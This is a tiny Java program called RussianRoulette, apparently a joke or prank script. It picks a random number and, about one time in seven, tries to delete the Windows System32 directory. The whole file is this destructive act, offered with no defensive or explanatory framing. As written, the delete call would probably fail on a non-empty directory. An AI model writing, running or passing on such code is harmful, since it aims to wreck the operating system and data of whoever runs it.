import java.io.File;
import java.util.Random;
public class RussianRoulette {
    public static void main(String[] args) {
        Random rand = new Random();
        if (rand.nextInt(7) == 1) {
            new File("C:/Windows/System32").delete();
        }
    }
}
